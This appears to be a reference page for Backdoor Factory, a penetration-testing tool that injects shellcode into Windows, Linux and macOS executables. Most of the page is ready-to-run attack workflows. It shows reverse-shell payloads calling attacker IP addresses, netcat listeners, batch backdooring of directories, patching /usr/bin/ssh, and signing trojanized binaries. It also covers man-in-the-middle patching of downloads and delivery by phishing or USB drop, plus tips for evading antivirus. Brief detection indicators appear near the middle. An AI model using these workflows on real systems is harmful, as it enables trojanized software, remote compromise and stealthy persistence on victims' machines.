---
title: "Backdoor Factory (BDF)"
slug: "backdoor-factory"
version: "3.4.2"
category: "Persistence"
author: "Joshua Pitts (@midnite_runr)"
license: "BSD-3-Clause"
repository: "https://github.com/secretsquirrel/the-backdoor-factory"
kali_page: "https://www.kali.org/tools/backdoor-factory/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
description: "PE/ELF/Mach-O binary patching tool that injects shellcode into executables while preserving normal execution flow"
platforms:
  - "Linux"
  - "Windows (cross-compilation)"
tags:
  - "binary-patching"
  - "shellcode-injection"
  - "pe-infection"
  - "elf-patching"
  - "backdoor"
  - "persistence"
  - "code-caves"
---

# Backdoor Factory (BDF)

The Backdoor Factory patches executable binaries with user-supplied shellcode while preserving the original execution flow. Targets PE (Windows), ELF (Linux), and Mach-O (macOS) binaries, including FAT binaries. Demonstrated at Black Hat USA 2015, Shmoocon 2015, DerbyCon 2013/2014.

## Overview

BDF operates by locating code caves (unused byte sequences) within existing binaries, injecting shellcode into those caves, and patching the entry point to execute the shellcode before jumping to the original program logic. This technique maintains the binary's apparent functionality while embedding a backdoor.

**Core Capabilities:**
- Inject shellcode into PE, ELF, and Mach-O binaries via code caves or new sections
- Automatic or manual code cave selection with cave jumping support
- Import Address Table (IAT) patching for stealthier payloads
- Directory-wide batch backdooring
- PE code signing with user-supplied certificates
- User-supplied shellcode support
- OnionDuke-style binary replacement patching

**Supported Formats:**
- Windows PE x86/x64 (including UPX-packed)
- ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32)
- Mach-O x86/x64 (including FAT binaries)
- Experimental: OpenBSD x32

## Installation

```bash
sudo apt update && sudo apt install -y backdoor-factory
```

**Explanation:** Installs BDF from Kali repositories along with dependencies (capstone, pefile, osslsigncode, python3).

### Manual Installation

```bash
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory
sudo pip3 install capstone
pip3 install pefile
./install.sh
```

### Docker

```bash
docker pull secretsquirrel/the-backdoor-factory
docker run -it secretsquirrel/the-backdoor-factory bash
```

## Dependencies

- **python3**: Runtime interpreter
- **python3-capstone**: Disassembly engine for code analysis
- **python3-pefile**: PE file parsing
- **osslsigncode**: PE code signing (included in repo)
- **curl**: Used for updates

## Architecture

BDF uses modular bin-parsing classes:
- **pebin.py**: Windows PE file parsing, code cave detection, section manipulation
- **elfbin.py**: ELF binary parsing, TEXT segment extension, shellcode injection
- **machobin.py**: Mach-O parsing, pre-text section patching, signature removal
- **backdoor.py**: Main orchestrator, payload selection, user interface
- **preprocessor/**: Binary modification scripts run before injection

The injection pipeline follows: **Parse binary → Identify caves → Select shellcode → Patch entry point → Create resume stub → (Optionally sign) → Output patched file**.

## Usage

### Basic Shellcode Injection (Code Cave)

```bash
backdoor-factory -f /usr/share/windows-binaries/plink.exe \
  -H 192.168.1.200 -P 4444 -s reverse_shell_tcp_inline
```

**Explanation:** Patches `plink.exe` with a reverse TCP shell connecting to `192.168.1.200:4444`. BDF scans for code caves of sufficient size, presents options, and injects into the selected cave.

### Injection with New Section

```bash
backdoor-factory -f /usr/share/windows-binaries/plink.exe \
  -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a
```

**Explanation:** The `-a` flag forces creation of a new section for shellcode instead of using existing caves. Higher success rate but more detectable by AV.

### Batch Directory Backdooring

```bash
backdoor-factory -d /path/to/binaries/ -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a
```

**Explanation:** Iterates all executables in the target directory, patching each with the specified shellcode. Use `-a` for reliability with diverse binaries.

### User-Supplied Shellcode

```bash
msfvenom windows/exec CMD="calc.exe" -f raw > calc.bin
backdoor-factory -f target.exe -s user_supplied_shellcode -U calc.bin
```

**Explanation:** Injects arbitrary shellcode from an external file. Must match the target binary's architecture (x86/x64).

### Code Cave Mining

```bash
backdoor-factory -f target.exe -c -l 500
```

**Explanation:** Lists all code caves in the binary that can fit 500 bytes of shellcode. Useful for reconnaissance before injection.

### PE Code Signing

```bash
echo -n "certpassword" > certs/passFile.txt
cp signingCert.cer certs/signingCert.cer
cp signingPrivateKey.pem certs/signingPrivateKey.pem
backdoor-factory -f target.exe -s iat_reverse_tcp_inline \
  -H 192.168.1.200 -P 4444 -m automatic -C
```

**Explanation:** Signs the patched binary using a PE code signing certificate. Requires the certificate and private key in the `certs/` directory with the password file.

### Automatic Patching Mode

```bash
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 \
  -s iat_reverse_tcp_inline -m automatic
```

**Explanation:** Automatically selects optimal cave and patching strategy. Recommended for most use cases with threaded payloads.

### Injector Module (Windows Only)

```bash
backdoor-factory -i -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -a -u .moocowwow
```

**Explanation:** Hunts target executables on disk, kills running processes/services, injects shellcode, backs up originals with the specified suffix, and restarts processes.

### Code Cave Jumping

```bash
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -J
```

**Explanation:** Splits shellcode across multiple code caves, linking them with jumps. Makes static analysis harder by fragmenting the payload.

### OnionDuke Patching

```bash
backdoor-factory -f originalfile.exe -m onionduke -b pentest.dll
```

**Explanation:** Replaces the binary's resource section with a supplied DLL/EXE while maintaining the original binary's appearance. Based on OnionDuke nation-state malware techniques.

### Support Check

```bash
backdoor-factory -f target.exe -S -v
```

**Explanation:** Checks if the binary is supported without modifying it. Verbose mode provides detailed format information.

## Payload Reference

| Payload | Description | Requirements |
|---------|-------------|--------------|
| `reverse_shell_tcp` | Reverse TCP shell | -H, -P |
| `reverse_shell_tcp_inline` | Inline reverse TCP (no new process) | -H, -P |
| `reverse_tcp_stager_threaded` | Threaded reverse TCP stager | -H, -P |
| `iat_reverse_tcp` | IAT-based reverse TCP | -H, -P |
| `iat_reverse_tcp_inline` | IAT inline reverse TCP | -H, -P |
| `bind_shell_tcp` | Bind shell on target | -P |
| `user_supplied_shellcode` | Arbitrary shellcode | -U |

### x64 Specific

| Payload | Description |
|---------|-------------|
| `reverse_tcp_x64` | 64-bit reverse TCP |
| `iat_reverse_tcp_x64` | 64-bit IAT reverse TCP |

### macOS

| Payload | Description |
|---------|-------------|
| `reverse_shell_tcp` | macOS reverse shell |
| `delay_reverse_shell_tcp` | Delayed reverse shell (-B seconds) |
| `beaconing_reverse_shell_tcp` | Beaconing reverse shell (-B interval) |

## Patching Methods

### Manual (`-m manual`)
Default mode. Presents code cave options interactively.

### Automatic (`-m automatic`)
Selects optimal cave and settings automatically. Requires threaded payloads.

### Replace (`-m replace`)
Direct binary replacement. Use with `-b supplied_binary.exe` for BDFProxy workflows.

### OnionDuke (`-m onionduke`)
Resource section replacement technique based on the OnionDuke malware family.

## Code Cave Strategies

**Single (`s`)**: All shellcode in one cave. Simplest, most reliable.

**Jump (`j`)**: Shellcode split across caves with jump instructions. Better stealth.

**Append (`a`)**: Creates a new cave by appending to a section. No existing cave needed.

**Ignore (`i`/`q`)**: Skip this binary.

## Configuration Options

| Flag | Purpose | Default |
|------|---------|---------|
| `-f FILE` | Target binary | Required |
| `-s SHELL` | Payload type | Required |
| `-H HOST` | C2 IP address | Required |
| `-P PORT` | C2 port | Required |
| `-a` | Add new section | Off |
| `-J` | Enable cave jumping | Off |
| `-m METHOD` | Patching method | manual |
| `-C` | Enable code signing | Off |
| `-X` | XP legacy support | Off |
| `-A` | IDT in code cave (experimental) | Off |
| `-L` | Skip DLL patching | Off |
| `-Z` | Zero certificate table pointer | Off |
| `-R` | Run-as admin manifest patching | Off |
| `-v` | Verbose output | Off |
| `-T TYPE` | Filter: ALL, x86, x64 | ALL |
| `-o FILE` | Custom output filename | auto |
| `-w` | Change section to RWE | On |
| `-n NAME` | New section name (<7 chars) | auto |

## Limitations

- **Not universal**: Some binaries have built-in protections that prevent patching. Always test on target binaries before deployment.
- **NSIS installers**: Not yet supported (future bypass planned).
- **Bound imports**: PE files with bound imports cannot be patched.
- **AV detection**: New sections are more detectable than code caves. Code cave jumping reduces detection.
- **Architecture matching**: User-supplied shellcode must match the target's architecture.
- **ELF injection**: Extends the TEXT segment by 1000 bytes, which may be detected.
- **XP mode**: Default payloads crash on XP; use `-X` flag for legacy support.

## Detection Indicators

- Modified section permissions (RWE flags)
- New sections in PE files
- Altered entry point instructions
- Cleared certificate table pointers
- Modified Import Address Tables
- Unusual code cave usage patterns

## MITRE ATT&CK Mapping

- **T1554** - Compromise Client Software Binary
- **T1027** - Obfuscated Files or Information
- **T1036** - Masquerading
- **T1553.002** - Code Signing

## Practical Scenarios

### Red Team Binary Dropper
```bash
# Patch a legitimate utility with reverse shell
backdoor-factory -f /usr/share/windows-binaries/putty.exe \
  -H 10.10.14.5 -P 443 -s iat_reverse_tcp_inline -m automatic -C
# Deploy the patched binary to target
```

### C2 Infrastructure Setup
```bash
# Start listener
nc -nlvp 443
# Patch binary for persistence
backdoor-factory -f /usr/share/windows-binaries/plink.exe \
  -H 192.168.1.100 -P 443 -s reverse_shell_tcp_inline -J
```

### ELF Backdoor for Linux Pivot
```bash
# Patch a legitimate Linux utility
backdoor-factory -f /usr/bin/ssh -H 192.168.1.100 -P 4444 \
  -s reverse_shell_tcp -a
```

## How Code Caves Work

A code cave is a sequence of null bytes (or rarely-executed instructions) within a binary. Compilers and linkers leave these gaps between functions, sections, or due to alignment padding. BDF exploits these gaps by:

1. **Scanning** the binary for contiguous null byte sequences (0x00) of sufficient length
2. **Verifying** the cave is within an executable or writable section
3. **Injecting** shellcode into the cave, replacing null bytes
4. **Patching** the entry point with a `JMP` to the cave address
5. **Creating** a resume stub that jumps back to the original entry point after shellcode execution

### Code Cave Anatomy

```
Original Binary Layout:
┌──────────────────────┐ 0x1000
│ .text (code)         │
│   func_1             │
│   func_2             │
│   [NULL GAP]         │ ← Code Cave (0x100-0x200)
│   func_3             │
├──────────────────────┤ 0x3000
│ .rdata (read data)   │
├──────────────────────┤ 0x4000
│ .data (writable)     │
└──────────────────────┘

After BDF Injection:
┌──────────────────────┐ 0x1000
│ .text (code)         │
│   func_1             │
│   func_2             │
│   JMP <shellcode>    │ ← Entry point patched
│   func_3             │
│ [CAVE: shellcode]    │ ← Shellcode injected
│ [CAVE: resume stub]  │ ← JMP back to original EP
├──────────────────────┤ 0x3000
│ .rdata (read data)   │
├──────────────────────┤ 0x4000
│ .data (writable)     │
└──────────────────────┘
```

### PE Binary Format Deep Dive

BDF parses these critical PE structures:

- **DOS Header**: MZ signature, `e_lfanew` offset to PE header
- **PE Signature**: "PE\0\0" magic bytes
- **COFF Header**: Machine type, section count, characteristics
- **Optional Header**: Entry point address, image base, section alignment
- **Section Table**: Section names, virtual sizes, raw data offsets, flags
- **Import Directory Table**: DLL imports (LoadLibraryA, GetProcAddress used by IAT payloads)
- **Certificate Table**: Digital signature pointer (cleared by BDF with `-Z`)

### ELF Binary Format Deep Dive

BDF handles ELF structures:

- **ELF Header**: Magic bytes, class (32/64), endianness, entry point
- **Program Headers**: LOAD segments, PT_DYNAMIC, PT_INTERP
- **Section Headers**: .text, .data, .bss, .plt, .got
- **Symbol Table**: Function addresses for cave identification

BDF extends the `.text` segment by 1000 bytes to create injection space, adjusting program headers accordingly.

## Advanced Techniques

### IAT Patching

Import Address Table patching replaces imported function pointers with shellcode addresses. This technique:

- Uses the binary's existing imports (LoadLibraryA, GetProcAddress)
- Avoids creating new sections
- Bypasses some AV detections that scan for new sections
- Works with the `-A` flag (experimental: IDT in code cave)

```bash
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 \
  -s iat_reverse_tcp_inline -m automatic -A
```

**Explanation:** Places the new Import Directory Table in a code cave rather than a new section. Higher risk of binary failure — test first.

### Preprocessor Scripts

BDF includes a preprocessor that modifies binaries before injection:

```bash
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -p
```

**Explanation:** Runs preprocessing scripts from the `preprocessor/` directory before payload injection. Allows binary modification for compatibility.

### Mach-O Specific Features

```bash
# Force x86 patching in FAT binary
backdoor-factory -f macho_binary -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -F x86

# Force both architectures
backdoor-factory -f macho_binary -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -F ALL
```

**Explanation:** For FAT Mach-O binaries containing multiple architectures, the `-F` flag controls which architecture(s) to patch.

### ELF-Specific Injection

```bash
# Patch ELF binary with new section
backdoor-factory -f /usr/bin/target -H 192.168.1.200 -P 4444 \
  -s reverse_shell_tcp -a -n .back
```

**Explanation:** Adds a new ELF section named `.back` for shellcode. The `-n` flag specifies the section name (must be <7 characters).

## Complete Workflow Examples

### Full Red Team Binary Implantation

```bash
# Step 1: Identify target binary
file /usr/share/windows-binaries/putty.exe
# Output: PE32+ executable (console) x86-64, for MS Windows

# Step 2: Check compatibility
backdoor-factory -f /usr/share/windows-binaries/putty.exe -S -v

# Step 3: Mine code caves
backdoor-factory -f /usr/share/windows-binaries/putty.exe -c -l 400

# Step 4: Generate listener
nc -nlvp 443

# Step 5: Patch binary
backdoor-factory -f /usr/share/windows-binaries/putty.exe \
  -H 10.10.14.5 -P 443 -s iat_reverse_tcp_inline -m automatic -C

# Step 6: Verify output
ls -la backdoored/putty.exe
file backdoored/putty.exe

# Step 7: Deploy to target
# (via phishing, USB drop, network share, etc.)

# Step 8: Receive connection
# On attacker machine
nc -nlvp 443
```

### BDFProxy Network Man-in-the-Middle

```bash
# BDFProxy patches binaries in transit (e.g., HTTP downloads)

# Step 1: Configure BDFProxy
cat bdfproxy.cfg
# [proxy]
# Interface: eth0
# Port: 8080
# ShellcodePort: 443

# Step 2: Start BDFProxy
bdfproxy -q

# Step 3: Configure target's proxy
# Set HTTP proxy to attacker:8080

# Step 4: Wait for target to download executables
# BDFProxy automatically patches them in transit
```

### Multi-Format Batch Operation

```bash
# Patch all Windows binaries in a directory
backdoor-factory -d /usr/share/windows-binaries/ \
  -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a -T x86

# Patch only x64 binaries
backdoor-factory -d /usr/share/windows-binaries/ \
  -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a -T x64

# Skip DLLs, only patch EXEs
backdoor-factory -d /usr/share/windows-binaries/ \
  -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a -L
```

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| "Binary not supported" | Format not recognized | Check file type with `file` |
| "Bound imports found" | PE has bound imports | Use different binary |
| "Code cave too small" | No suitable cave found | Use `-a` for new section |
| "NSIS installer" | NSIS-packed binary | Not supported, use another binary |
| "Certificate table error" | Signature processing failed | Use `-Z` to zero cert table |
| "Architecture mismatch" | Shellcode wrong arch | Verify with `-T` flag |

## Best Practices

1. **Always test first**: Use `-S` to check compatibility before patching
2. **Use `-m automatic`**: Manual cave selection is slower and error-prone
3. **Prefer IAT payloads**: `iat_reverse_tcp_inline` is stealthier than standard reverse shells
4. **Sign patched binaries**: Use `-C` with a legitimate-looking certificate
5. **Use code cave jumping**: `-J` splits shellcode across caves for better AV evasion
6. **Test on target platform**: Patched binaries may behave differently on different Windows versions
7. **Keep backups**: BDF outputs to `backdoored/` directory, but always maintain originals

## Related Tools

- **msfvenom**: Shellcode generation for use with BDF
- **BDFProxy**: Network-level binary patching (companion tool by same author)
- **peframe**: PE file analysis for pre-injection reconnaissance
- **detect-it-easy**: Binary identification and analysis
- **pestudio**: PE file static analysis
- **Exeinfo PE**: PE identifier and detector
- **CFF Explorer**: PE header editor
- **Lord PE**: PE header manipulation

## Resources

- [GitHub Repository](https://github.com/secretsquirrel/the-backdoor-factory)
- [Kali Linux Package](https://www.kali.org/tools/backdoor-factory/)
- [Black Hat USA 2015 Presentation](https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf)
- [Black Hat USA 2015 Video](https://www.youtube.com/watch?v=OuyLzkG16Uk)
- [Shmoocon 2015 Paper](https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf)
- [BDF Wiki](https://github.com/secretsquirrel/the-backdoor-factory/wiki)
- [PE Code Signing Blog Post](http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html)
- [MITRE ATT&CK TA0003](https://attack.mitre.org/tactics/TA0003/)
